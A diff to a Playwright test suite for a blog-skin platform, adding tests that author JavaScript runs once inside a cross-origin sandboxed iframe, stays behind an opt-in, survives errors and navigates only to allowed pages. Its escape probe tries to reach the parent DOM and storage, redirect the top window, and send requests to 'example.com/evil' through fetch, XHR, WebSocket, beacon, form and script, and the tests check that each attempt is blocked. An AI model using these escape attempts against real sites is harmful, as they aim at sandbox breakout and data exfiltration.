@@ -36,6 +36,19 @@
      [package]   Import -> Export -> Import 왕복에서 renderMode 보존,
                  모르는 renderMode는 reason:"render-mode"로 거부
 
+   SANDBOX-5A에서 더해진 것
+     [authorjs]      저자 JS 가 프레임 안에서 **정확히 한 번** 돌고
+                     클릭/파티클/드래그가 실제로 동작하는가,
+                     전용 opt-in 이 없으면 0회인가,
+                     JS 가 죽어도 HTML/CSS 가 남는가,
+                     그리고 탈출(부모 DOM · 부모 localStorage ·
+                     top.location · window.open · form · fetch/XHR/
+                     WebSocket/EventSource/beacon · 외부 script ·
+                     위조 postMessage · 관리자 주소)이 전부 막히는가
+     [authorjspages] 공개 다섯 화면에서도 한 번씩 돌고, 화면을
+                     오가도 타이머가 쌓이지 않으며,
+                     imorySkin.navigate() 가 실제로 화면을 옮기는가
+
    ★ 두 origin을 어떻게 만드는가
    포트가 다르면 origin이 다르다(같은 localhost라도). 부모는 8957,
    frame은 8958이다. 두 서버 모두 요청을 **배포되는 그 Pages
@@ -575,6 +588,20 @@ async function runCsp() {
     has(`frame-ancestors ${PARENT_ORIGIN}`), csp);
   check("[csp] ★ script-src 에 unsafe-inline / unsafe-eval 이 없다",
     csp.indexOf("unsafe-inline") === -1 && csp.indexOf("unsafe-eval") === -1);
+
+  /*
+    ★ SANDBOX-5A. 저자 JS 가 실행되기 시작했지만 CSP 는 넓히지
+    않았다 — nonce 가 붙은 inline script 하나로 끝났기 때문이다
+    (설계 문서 §O-3). 그 사실을 응답 헤더로 못박는다: 원래 계획이던
+    blob: 가 **어디에도 없다**.
+  */
+
+  check("[csp] ★ 저자 JS 때문에 blob: 을 열지 않았다",
+    csp.indexOf("blob:") === -1 ||
+    csp.indexOf("img-src") !== -1 &&
+      (csp.split("; ").find(d => d.indexOf("script-src ") === 0) || "")
+        .indexOf("blob:") === -1,
+    csp.split("; ").find(d => d.indexOf("script-src ") === 0) || "");
 
 
   /* =====================================================
@@ -1964,6 +1991,34 @@ async function runPackage(browser) {
   check("[package] ★ 모르는 renderMode 는 Export 에도 실리지 않는다",
     r.weirdExportHasKey === false);
 
+
+  /* --- SANDBOX-5A — 작성 JS 도 왕복에서 사라지지 않는다 --- */
+
+  check("[package] ★ js 가 Import -> Export -> Import 왕복에서 그대로다",
+    Boolean(r.js) && r.js.importOk === true &&
+    r.js.value === "window.__x = 1;" &&
+    r.js.exported === "window.__x = 1;" &&
+    r.js.reimported === "window.__x = 1;",
+    JSON.stringify(r.js));
+
+  check("[package] ★ 빈 js 도 값이다 (통과하고 보존된다)",
+    Boolean(r.jsEmpty) && r.jsEmpty.ok === true &&
+    r.jsEmpty.hasKey === true && r.jsEmpty.value === "",
+    JSON.stringify(r.jsEmpty));
+
+  check("[package] js 가 없는 스킨은 결과에도 키가 없다",
+    Boolean(r.jsAbsent) && r.jsAbsent.ok === true &&
+    r.jsAbsent.hasKey === false,
+    JSON.stringify(r.jsAbsent));
+
+  check('[package] ★ 문자열이 아니거나 너무 긴 js 는 reason:"author-js" 로 거부된다',
+    Array.isArray(r.jsBad) && r.jsBad.length === 5 &&
+    r.jsBad.every((x) => x.ok === false && x.reason === "author-js"),
+    JSON.stringify(r.jsBad));
+
+  check("[package] ★ 이상한 js 는 Export 에도 실리지 않는다",
+    r.jsWeirdExportHasKey === false);
+
   await ctx.close();
 
 }
@@ -2350,15 +2405,24 @@ async function openPublicPath(browser, skinPackage, subPath, options) {
   page.on("pageerror", err => pageErrors.push(String(err && err.message || err)));
 
   await page.addInitScript(
-    ([origin, sandboxEnabled]) => {
+    ([origin, sandboxEnabled, authorJsEnabled]) => {
       try {
         if (sandboxEnabled) {
           localStorage.setItem("imory.sandboxSkin", "1");
           localStorage.setItem("imory.sandboxSkinOrigin", origin);
         }
+        /*
+          ★ SANDBOX-5A — 저자 JS 는 **별도** opt-in 이다. 이 줄이
+          없으면 sandbox 프레임은 뜨지만 저자 JS 는 한 줄도 돌지
+          않는다(그것이 기존 절들이 이 라운드 뒤에도 그대로 도는
+          이유다).
+        */
+        if (authorJsEnabled) {
+          localStorage.setItem("imory.sandboxSkinJs", "1");
+        }
       } catch (err) { /* 저장소가 막혀 있으면 플래그 없이 돈다 */ }
     },
-    [SANDBOX_ORIGIN, opts.sandbox !== false]
+    [SANDBOX_ORIGIN, opts.sandbox !== false, opts.authorJs === true]
   );
 
   await installHomeSupabaseMock(page, skinPackage);
@@ -3308,6 +3372,785 @@ function realPageErrors(list) {
 }
 
 
+
+
+/* =========================================================
+   [authorjs] SANDBOX-5A — 저자 JS
+
+   무엇을 보는가
+   -------------
+   1. 기능   프레임 안에서 **정확히 한 번** 돌고, 클릭/파티클/
+             드래그가 실제로 동작하는가
+   2. 수명   화면을 오가도 타이머/리스너가 쌓이지 않는가
+   3. 관문   전용 opt-in 이 없으면 0회, renderMode 가 native 면 0회
+   4. 보안   저자 코드가 부모·네트워크·다른 창에 닿지 못하는가
+   5. 오류   JS 가 죽어도 HTML/CSS 는 그대로인가
+
+   ★ 탈출 코드는 fixture 가 아니라 이 파일에 있다.
+   하네스가 window.__sandboxHarnessAuthorJsOverride 를 보고 그
+   문자열을 skinPackage.js 로 쓴다 — fixture 는 "정상적으로 쓰는
+   JS"의 본보기로 두고, 공격 코드는 그것을 기대하는 테스트 옆에
+   둔다.
+========================================================== */
+
+/* 저자 JS 를 켜는 dev opt-in. sandbox 플래그와 **별개**다. */
+
+const AUTHOR_JS_QUERY =
+  ON_QUERY + "&authorJs=1&sandboxSkinJs=1";
+
+
+/*
+  탈출을 시도하는 코드. 결과는 렌더 루트의 data-imory-probe 에
+  JSON 으로 남긴다 — 프레임 realm 안에서 읽는다.
+*/
+
+const ESCAPE_PROBE = `
+(function () {
+  var root = document.getElementById("sandboxFrameRoot");
+  var out = {};
+  var attempt = function (name, fn) {
+    try { out[name] = "OK:" + String(fn()); }
+    catch (err) { out[name] = "THREW:" + (err && err.name); }
+  };
+
+  attempt("parentDocument", function () {
+    return window.parent.document.body.childElementCount;
+  });
+  attempt("parentStorage", function () {
+    return window.parent.localStorage.length;
+  });
+  attempt("topLocation", function () {
+    window.top.location = "https://example.com/evil";
+    return "assigned";
+  });
+  attempt("windowOpen", function () {
+    return String(window.open("https://example.com/evil"));
+  });
+  attempt("fetch", function () {
+    window.fetch("https://example.com/evil");
+    return "called";
+  });
+  attempt("xhr", function () {
+    var x = new XMLHttpRequest();
+    x.open("GET", "https://example.com/evil");
+    x.send();
+    return "sent";
+  });
+  attempt("websocket", function () {
+    return String(new WebSocket("wss://example.com/evil"));
+  });
+  attempt("eventsource", function () {
+    return String(new EventSource("https://example.com/evil"));
+  });
+  attempt("beacon", function () {
+    return String(navigator.sendBeacon("https://example.com/evil", "x"));
+  });
+  attempt("formSubmit", function () {
+    var f = document.createElement("form");
+    f.method = "POST";
+    f.action = "https://example.com/evil";
+    document.body.appendChild(f);
+    f.submit();
+    return "submitted";
+  });
+  attempt("externalScript", function () {
+    var s = document.createElement("script");
+    s.src = "https://example.com/evil.js";
+    document.head.appendChild(s);
+    return "appended";
+  });
+  /*
+    nonce 를 두 갈래로 잰다.
+
+      globalNonce  : 우리가 계약으로 남기지 않기로 한 전역 이름
+      currentNonce : 지금 실행 중인 자기 script 요소의 nonce
+
+    두 번째는 **읽힌다.** nonce 는 허가 표식이지 임의 JS 실행
+    이후의 비밀이 아니다 — 아래 check 가 그 사실을 그대로 기록한다.
+  */
+
+  attempt("globalNonce", function () {
+    return String(window.__imorySandboxNonce);
+  });
+  attempt("currentNonce", function () {
+    var el = document.currentScript;
+    if (!el) { return "NO-CURRENT-SCRIPT"; }
+    return (el.nonce ? "READABLE" : "EMPTY") +
+      "/attr:" + (el.getAttribute("nonce") ? "READABLE" : "EMPTY");
+  });
+  attempt("unknownMessage", function () {
+    window.parent.postMessage(
+      { imory: 1, type: "IMORY_EVAL", seq: 1, payload: { code: "x" } }, "*");
+    return "posted";
+  });
+  attempt("adminNavigate", function () {
+    return String(window.imorySkin.navigate("/testuser/admin?manage=1"));
+  });
+  attempt("forgedNavigate", function () {
+    window.parent.postMessage(
+      { imory: 1, type: "IMORY_NAVIGATE", seq: 9,
+        payload: { contract: 1, renderSeq: 1, href: "https://example.com/evil" } },
+      "*");
+    return "posted";
+  });
+
+  root.setAttribute("data-imory-probe", JSON.stringify(out));
+}());
+`;
+
+
+async function openAuthorJsHarness(browser, query, override, viewport) {
+
+  const ctx = await browser.newContext({
+    viewport: viewport || { width: 900, height: 900 }
+  });
+
+  const page = await ctx.newPage();
+
+  if (typeof override === "string") {
+    await page.addInitScript(
+      (code) => { window.__sandboxHarnessAuthorJsOverride = code; },
+      override
+    );
+  }
+
+  await page.goto(PARENT_ORIGIN + HARNESS_PATH + query, { waitUntil: "load" });
+
+  await page.waitForFunction(
+    () => window.__sandboxHarnessResult !== undefined,
+    null,
+    { timeout: 20000 }
+  );
+
+  return { ctx, page };
+
+}
+
+
+async function readAuthorJsMarks(frame) {
+
+  return frame.evaluate(() => {
+
+    const root = document.getElementById("sandboxFrameRoot");
+
+    if (!root) return null;
+
+    const read = (name) => root.getAttribute("data-imory-authorjs-" + name);
+
+    return {
+      runs: read("runs"),
+      page: read("page"),
+      api: read("api"),
+      clicks: read("clicks"),
+      frames: read("frames"),
+      ticks: read("ticks"),
+      drag: read("drag"),
+      nav: read("nav"),
+      badnav: read("badnav"),
+      globalTicks: window.__imoryFixtureTicks || 0,
+      hasApi: typeof window.imorySkin === "object" && window.imorySkin !== null,
+      apiKeys: window.imorySkin ? Object.keys(window.imorySkin).sort() : [],
+      scripts: document.querySelectorAll("script[data-imory-author-js]").length
+    };
+
+  });
+
+}
+
+
+async function runAuthorJs(browser) {
+
+  console.log("\n[authorjs] 저자 JS — 실행 · 수명 · 관문 · 보안");
+
+
+  /* ===== 1. 기본: 프레임 안에서 정확히 한 번 돈다 ======== */
+
+  {
+    const { ctx, page } =
+      await openAuthorJsHarness(browser, AUTHOR_JS_QUERY);
+
+    const frame = await waitForSandboxRender(page);
+
+    check("[authorjs] 프레임이 떴다", Boolean(frame));
+
+    if (frame) {
+
+      await frame.waitForFunction(
+        () => document.getElementById("sandboxFrameRoot")
+          .hasAttribute("data-imory-authorjs-runs"),
+        null,
+        { timeout: 10000 }
+      ).catch(() => {});
+
+      const marks = await readAuthorJsMarks(frame);
+
+      check("[authorjs] ★ 저자 JS 가 프레임 안에서 정확히 한 번 돌았다",
+        marks && marks.runs === "1", marks ? String(marks.runs) : "(없음)");
+
+      check("[authorjs] ★ script 요소도 한 개뿐이다",
+        marks && marks.scripts === 1, marks ? String(marks.scripts) : "");
+
+      check("[authorjs] ★ API 가 계약대로 왔다 (version 1 · 키 여섯)",
+        marks && marks.api === "1" && marks.page === "home" &&
+        JSON.stringify(marks.apiKeys) === JSON.stringify(
+          ["context", "navigate", "onCleanup", "pageType", "root", "version"]),
+        marks ? JSON.stringify(marks.apiKeys) : "");
+
+
+      /* --- 버튼 클릭으로 패널 열고 닫기 --------------- */
+
+      const panel = frame.locator(".sb-js-panel");
+
+      check("[authorjs] 처음에 패널은 닫혀 있다",
+        (await panel.getAttribute("data-open")) === "0");
+
+      await frame.locator(".sb-js-toggle").click();
+
+      check("[authorjs] ★ 버튼을 누르면 패널이 열린다",
+        (await panel.getAttribute("data-open")) === "1" &&
+        (await panel.isVisible()) === true);
+
+      await frame.locator(".sb-js-toggle").click();
+
+      check("[authorjs] ★ 다시 누르면 닫힌다",
+        (await panel.getAttribute("data-open")) === "0" &&
+        (await panel.isVisible()) === false);
+
+
+      /* --- 파티클 (requestAnimationFrame) -------------- */
+
+      await frame.waitForFunction(
+        () => Number(document.getElementById("sandboxFrameRoot")
+          .getAttribute("data-imory-authorjs-frames") || "0") > 3,
+        null,
+        { timeout: 8000 }
+      ).catch(() => {});
+
+      const afterFrames = await readAuthorJsMarks(frame);
+
+      check("[authorjs] ★ 파티클이 실제로 움직인다 (rAF 가 돈다)",
+        Number(afterFrames.frames || "0") > 3, String(afterFrames.frames));
+
+      const dotMoved = await frame.evaluate(() => {
+        const dot = document.querySelector(".sb-js-dot");
+        return dot ? dot.style.left : "";
+      });
+
+      check("[authorjs] ★ 파티클의 좌표가 CSSOM 으로 실제로 쓰였다",
+        /%$/.test(dotMoved), dotMoved);
+
+
+      /* --- 드래그 ------------------------------------- */
+
+      const card = frame.locator(".sb-js-card");
+
+      /*
+        ★ 먼저 화면 안으로 끌어온다. 프레임은 스크롤이 없고
+        (overflow:hidden + 높이를 부모가 맞춘다) 카드는 문서
+        아래쪽에 있어서, 뷰포트 밖 좌표로 mouse 를 움직이면
+        이벤트가 카드에 닿지 않는다.
+      */
+
+      await card.scrollIntoViewIfNeeded().catch(() => {});
+
+      const box = await card.boundingBox();
+
+      if (box) {
+
+        /*
+          ★ frame locator 의 boundingBox 는 이미 메인 프레임(페이지)
+          좌표다. iframe 의 위치를 한 번 더 더하면 두 배가 되어
+          카드 바깥을 누르게 된다.
+        */
+
+        const sx = box.x + box.width / 2;
+        const sy = box.y + box.height / 2;
+
+        await page.mouse.move(sx, sy);
+        await page.mouse.down();
+        await page.mouse.move(sx + 40, sy + 20, { steps: 6 });
+        await page.mouse.up();
+
+        const dragged = await readAuthorJsMarks(frame);
+
+        check("[authorjs] ★ 카드를 끌면 따라온다",
+          Boolean(dragged.drag) && dragged.drag !== "0,0",
+          String(dragged.drag));
+
+      }
+
+      else {
+        check("[authorjs] ★ 카드를 끌면 따라온다", false, "카드를 못 찾음");
+      }
+
+
+      /* --- 타이머가 한 벌뿐인가 ------------------------ */
+
+      await page.waitForTimeout(400);
+
+      const ticked = await readAuthorJsMarks(frame);
+
+      check("[authorjs] ★ 타이머가 돈다",
+        Number(ticked.ticks || "0") >= 2, String(ticked.ticks));
+
+      check("[authorjs] ★ 그리고 한 벌뿐이다 (전체 tick == 내 tick)",
+        Number(ticked.ticks) === Number(ticked.globalTicks),
+        ticked.ticks + " / " + ticked.globalTicks);
+
+
+      /* --- navigate() 는 표에 있는 주소만 --------------- */
+
+      await frame.locator(".sb-js-badnav").click();
+
+      const badnav = await readAuthorJsMarks(frame);
+
+      check("[authorjs] ★ 표에 없는 주소로는 navigate() 가 false 다",
+        badnav.badnav === "0", String(badnav.badnav));
+
+    }
+
+    await ctx.close();
+  }
+
+
+  /* ===== 2. 관문: 전용 opt-in 이 없으면 0회 ============== */
+
+  {
+    const { ctx, page } =
+      await openAuthorJsHarness(browser, ON_QUERY + "&authorJs=1");
+
+    const frame = await waitForSandboxRender(page);
+
+    check("[authorjs] (opt-in 없음) 화면은 그대로 그려진다", Boolean(frame));
+
+    if (frame) {
+
+      await page.waitForTimeout(500);
+
+      const marks = await readAuthorJsMarks(frame);
+
+      check("[authorjs] ★ 저자 JS 전용 opt-in 이 없으면 0회다",
+        marks.runs === null && marks.scripts === 0 && marks.hasApi === false,
+        JSON.stringify([marks.runs, marks.scripts, marks.hasApi]));
+
+      const drew = await frame.locator(".sb-js-toggle").count();
+
+      check("[authorjs] ★ 그래도 HTML/CSS 는 그대로다 (JS 만 빠진다)",
+        drew === 1, String(drew));
+
+    }
+
+    await ctx.close();
+  }
+
+
+  /* ===== 3. 관문: renderMode 가 native 면 프레임 자체가 없다 = */
+
+  {
+    const { ctx, page } =
+      await openAuthorJsHarness(
+        browser,
+        AUTHOR_JS_QUERY + "&renderMode=native"
+      );
+
+    check("[authorjs] ★ native 스킨은 프레임이 아예 없다 (JS 0회)",
+      (await page.locator("iframe").count()) === 0);
+
+    const ranInParent =
+      await page.evaluate(() =>
+        document.documentElement.outerHTML.indexOf("data-imory-authorjs-runs") !== -1);
+
+    check("[authorjs] ★ 부모 문서에서도 저자 JS 가 돌지 않았다",
+      ranInParent === false);
+
+    await ctx.close();
+  }
+
+
+  /* ===== 4. 오류: JS 가 죽어도 화면은 남는다 ============= */
+
+  {
+    const { ctx, page } =
+      await openAuthorJsHarness(
+        browser,
+        AUTHOR_JS_QUERY,
+        "window.__ranBefore = 1; null.x.y = 1;"
+      );
+
+    const frame = await waitForSandboxRender(page);
+
+    check("[authorjs] (runtime error) 화면은 그려졌다", Boolean(frame));
+
+    if (frame) {
+
+      const drew = await frame.locator(".sb-js-toggle").count();
+
+      check("[authorjs] ★ 런타임 오류가 HTML/CSS 렌더를 깨지 않는다",
+        drew === 1, String(drew));
+
+      const before = await frame.evaluate(() => window.__ranBefore || 0);
+
+      check("[authorjs] ★ 오류 전까지의 코드는 실행됐다 (감싸지 않았다)",
+        before === 1, String(before));
+
+    }
+
+    await ctx.close();
+  }
+
+  {
+    const { ctx, page } =
+      await openAuthorJsHarness(
+        browser,
+        AUTHOR_JS_QUERY,
+        "function ( { syntax error"
+      );
+
+    const frame = await waitForSandboxRender(page);
+
+    check("[authorjs] (syntax error) 화면은 그려졌다", Boolean(frame));
+
+    if (frame) {
+
+      const drew = await frame.locator(".sb-js-toggle").count();
+
+      check("[authorjs] ★ 문법 오류도 HTML/CSS 렌더를 깨지 않는다",
+        drew === 1, String(drew));
+
+    }
+
+    await ctx.close();
+  }
+
+
+  /* ===== 5. 보안: 탈출 시도 ============================== */
+
+  {
+    const { ctx, page } =
+      await openAuthorJsHarness(browser, AUTHOR_JS_QUERY, ESCAPE_PROBE);
+
+    const requests = [];
+    page.on("request", (req) => requests.push(req.url()));
+
+    let popups = 0;
+    page.on("popup", () => { popups += 1; });
+
+    const frame = await waitForSandboxRender(page);
+
+    check("[authorjs] (보안) 프레임이 떴다", Boolean(frame));
+
+    if (frame) {
+
+      await frame.waitForFunction(
+        () => document.getElementById("sandboxFrameRoot")
+          .hasAttribute("data-imory-probe"),
+        null,
+        { timeout: 10000 }
+      ).catch(() => {});
+
+      const probe =
+        await frame.evaluate(() => {
+          const raw = document.getElementById("sandboxFrameRoot")
+            .getAttribute("data-imory-probe");
+          return raw ? JSON.parse(raw) : null;
+        });
+
+      check("[authorjs] (보안) 탐침이 돌았다", Boolean(probe));
+
+      if (probe) {
+
+        check("[authorjs] ★ parent.document 접근이 막힌다",
+          String(probe.parentDocument).startsWith("THREW:"),
+          probe.parentDocument);
+
+        check("[authorjs] ★ parent.localStorage 접근이 막힌다",
+          String(probe.parentStorage).startsWith("THREW:"),
+          probe.parentStorage);
+
+        check("[authorjs] ★ top.location 변경이 막힌다",
+          String(probe.topLocation).startsWith("THREW:"),
+          probe.topLocation);
+
+        check("[authorjs] ★ window.open 이 새 창을 열지 못한다",
+          probe.windowOpen === "OK:null" ||
+          String(probe.windowOpen).startsWith("THREW:"),
+          probe.windowOpen);
+
+        /*
+          ★ 여기 두 줄이 nonce 에 대한 이 라운드의 **정확한 기록**이다.
+
+          (1) 우리는 계약으로 약속한 적 없는 전역 이름을 남기지
+              않는다 — bridge 가 값을 거둬 가고 window 에서 지운다.
+              이것은 노출 면 정리이지 은닉이 아니다.
+
+          (2) 이미 실행 중인 저자 JS 는 자기 script 요소의 nonce 를
+              **읽을 수 있다.** nonce 는 "이 script 를 실행해도
+              된다"는 허가 표식이지, 임의 JS 가 돈 뒤까지 지켜지는
+              보안 경계가 아니다. 그래도 문제가 되지 않는 이유는
+              경계가 다른 곳(별도 origin · CSP · sandbox 속성 ·
+              부모가 쥔 이동 표)에 있고, 그중 무엇도 nonce 가
+              비밀이라는 가정에 기대지 않기 때문이다. 저자가 그
+              값으로 script 를 하나 더 붙여도 얻는 것이 없다 —
+              이미 이 realm 에서 임의 코드를 돌리고 있다.
+
+          (2)를 "막혔다"로 적으면 문서가 거짓이 된다. 측정한
+          그대로 남긴다.
+        */
+
+        check("[authorjs] nonce 가 window 전역으로 남아 있지 않다 (은닉이 아니라 정리)",
+          probe.globalNonce === "OK:undefined", probe.globalNonce);
+
+        check("[authorjs] ★ (기록) 실행 중인 저자 JS 는 자기 script 의 nonce 를 읽는다 " +
+          "— nonce 는 허가 표식이지 보안 경계가 아니다",
+          String(probe.currentNonce).indexOf("READABLE") !== -1,
+          probe.currentNonce);
+
+        check("[authorjs] ★ 관리자 주소로는 navigate() 가 false 다",
+          probe.adminNavigate === "OK:false", probe.adminNavigate);
+
+      }
+
+
+      /* --- 네트워크: 실제로 나간 요청으로 판정한다 ------ */
+
+      await page.waitForTimeout(600);
+
+      const leaked =
+        requests.filter((url) => url.indexOf("example.com") !== -1);
+
+      check("[authorjs] ★ fetch/XHR/WebSocket/EventSource/beacon/form/" +
+        "외부 script 중 어느 것도 나가지 못했다",
+        leaked.length === 0, leaked.join(", "));
+
+      check("[authorjs] ★ 새 창이 열리지 않았다",
+        popups === 0, String(popups));
+
+      check("[authorjs] ★ 프레임은 여전히 sandbox origin 의 그 문서다",
+        frame.url().startsWith(SANDBOX_ORIGIN), frame.url());
+
+      check("[authorjs] ★ 부모 주소가 그대로다 (남의 사이트로 끌려가지 않았다)",
+        new URL(page.url()).origin === PARENT_ORIGIN &&
+        page.url().indexOf("example.com") === -1,
+        page.url());
+
+
+      /* --- 위조 메시지가 부모의 표를 우회하지 못한다 ---- */
+
+      const rejected =
+        await page.evaluate(() => window.__sandboxHarnessErrors || []);
+
+      check("[authorjs] ★ 위조 NAVIGATE 로 화면이 바뀌지 않았다",
+        page.url().indexOf("example.com") === -1,
+        JSON.stringify(rejected));
+
+    }
+
+    await ctx.close();
+  }
+
+
+  /* ===== 6. 모바일 390px ================================ */
+
+  {
+    const { ctx, page } =
+      await openAuthorJsHarness(
+        browser, AUTHOR_JS_QUERY, undefined, { width: 390, height: 780 });
+
+    const frame = await waitForSandboxRender(page);
+
+    check("[authorjs] (390px) 프레임이 떴다", Boolean(frame));
+
+    if (frame) {
+
+      const overflow =
+        await frame.evaluate(() =>
+          document.documentElement.scrollWidth - document.documentElement.clientWidth);
+
+      check("[authorjs] ★ 390px 에서 프레임이 가로로 넘치지 않는다",
+        overflow <= 0, String(overflow));
+
+      const parentOverflow =
+        await page.evaluate(() =>
+          document.documentElement.scrollWidth - document.documentElement.clientWidth);
+
+      check("[authorjs] ★ 390px 에서 부모도 가로로 넘치지 않는다",
+        parentOverflow <= 0, String(parentOverflow));
+
+    }
+
+    await ctx.close();
+  }
+
+}
+
+
+/* =========================================================
+   [authorjspages] 공개 다섯 화면 · 화면을 오가도 쌓이지 않는가
+
+   하네스가 아니라 **진짜 index.html** 로 공개 경로를 탄다
+   (supabase 만 mock — [home]/[nav] 절과 같은 장치).
+========================================================== */
+
+async function runAuthorJsPages(browser) {
+
+  console.log("\n[authorjspages] 저자 JS — 공개 다섯 화면 · 이동");
+
+  const pkg =
+    JSON.parse(
+      fs.readFileSync(
+        path.join(ROOT, "skin", "test-skins", "imory-sandbox-authorjs-v1.json"),
+        "utf8"
+      )
+    );
+
+
+  const screens = [
+    ["/", "home"],
+    ["/category/1", "category"],
+    ["/category/2", "category"],
+    ["/post/101", "post"],
+    ["/category/3", "banner"],
+    ["/highlights", "highlights"]
+  ];
+
+  for (const [subPath, pageType] of screens) {
+
+    const { ctx, page } =
+      await openPublicPath(browser, pkg, subPath, { authorJs: true });
+
+    const frame = await waitForSandboxPage(page, pageType);
+
+    check(`[authorjspages] ${subPath} 가 프레임에 떴다 (${pageType})`,
+      Boolean(frame));
+
+    if (frame) {
+
+      await frame.waitForFunction(
+        () => document.getElementById("sandboxFrameRoot")
+          .hasAttribute("data-imory-authorjs-runs"),
+        null,
+        { timeout: 10000 }
+      ).catch(() => {});
+
+      const marks = await readAuthorJsMarks(frame);
+
+      check(`[authorjspages] ★ ${pageType} 에서도 저자 JS 가 한 번 돈다`,
+        marks && marks.runs === "1" && marks.page === pageType,
+        marks ? marks.runs + " / " + marks.page : "(없음)");
+
+    }
+
+    await ctx.close();
+
+  }
+
+
+  /* --- 화면을 오가도 쌓이지 않는다 ---------------------- */
+
+  {
+    const { ctx, page } =
+      await openPublicPath(browser, pkg, "/", { authorJs: true });
+
+    let frame = await waitForSandboxPage(page, "home");
+
+    check("[authorjspages] (왕복) HOME 이 떴다", Boolean(frame));
+
+    if (frame) {
+
+      await frame.locator(".sb-nav-link", { hasText: "TXT" }).first().click();
+
+      frame = await waitForSandboxPage(page, "category");
+
+      check("[authorjspages] CATEGORY 로 갔다", Boolean(frame));
+
+    }
+
+    if (frame) {
+
+      await page.goBack();
+
+      frame = await waitForSandboxPage(page, "home");
+
+      check("[authorjspages] 뒤로가기로 HOME 에 돌아왔다", Boolean(frame));
+
+    }
+
+    if (frame) {
+
+      await frame.waitForFunction(
+        () => Number(document.getElementById("sandboxFrameRoot")
+          .getAttribute("data-imory-authorjs-ticks") || "0") >= 2,
+        null,
+        { timeout: 8000 }
+      ).catch(() => {});
+
+      const marks = await readAuthorJsMarks(frame);
+
+      check("[authorjspages] ★ 돌아온 화면에서도 저자 JS 는 한 번만 돌았다",
+        marks.runs === "1", String(marks.runs));
+
+      check("[authorjspages] ★ 타이머가 한 벌뿐이다 (옛 화면 것이 안 남았다)",
+        Number(marks.ticks) === Number(marks.globalTicks),
+        marks.ticks + " / " + marks.globalTicks);
+
+      const frameCount =
+        await page.locator("iframe.imory-skin-sandbox-frame").count();
+
+      check("[authorjspages] ★ 프레임이 쌓이지 않았다",
+        frameCount <= 2, String(frameCount));
+
+      const visibleFrames =
+        await page.evaluate(() =>
+          Array.from(document.querySelectorAll("iframe.imory-skin-sandbox-frame"))
+            .filter((el) => el.offsetParent !== null).length);
+
+      check("[authorjspages] ★ 보이는 프레임은 하나다",
+        visibleFrames === 1, String(visibleFrames));
+
+    }
+
+    await ctx.close();
+  }
+
+
+  /* --- imorySkin.navigate() 가 실제로 화면을 옮긴다 ------ */
+
+  {
+    const { ctx, page } =
+      await openPublicPath(browser, pkg, "/", { authorJs: true });
+
+    let frame = await waitForSandboxPage(page, "home");
+
+    check("[authorjspages] (navigate) HOME 이 떴다", Boolean(frame));
+
+    if (frame) {
+
+      const target =
+        await frame.locator(".sb-js-go").getAttribute("data-imory-authorjs-target");
+
+      check("[authorjspages] navigate() 대상 주소를 context 에서 읽었다",
+        typeof target === "string" && target.indexOf("/category/") !== -1,
+        String(target));
+
+      await frame.locator(".sb-js-go").click();
+
+      frame = await waitForSandboxPage(page, "category");
+
+      check("[authorjspages] ★ imorySkin.navigate() 로 CATEGORY 가 열린다",
+        Boolean(frame));
+
+      check("[authorjspages] ★ 주소도 함께 바뀌었다",
+        new URL(page.url()).pathname.indexOf("/category/") !== -1,
+        page.url());
+
+    }
+
+    await ctx.close();
+  }
+
+}
+
+
 async function runNav(browser) {
 
   console.log("\n[nav] 프레임 안 링크 · 뒤로가기 · 위조 거부");
@@ -4049,6 +4892,9 @@ async function runBodyParity(browser) {
     if (shouldRun("bodyparity")) await runBodyParity(browser);
     if (shouldRun("surfaces")) await runSurfaces(browser);
     if (shouldRun("nav")) await runNav(browser);
+
+    if (shouldRun("authorjs")) await runAuthorJs(browser);
+    if (shouldRun("authorjspages")) await runAuthorJsPages(browser);
 
     if (shouldRun("regress")) await runRegress();
     if (shouldRun("env")) await runEnv();
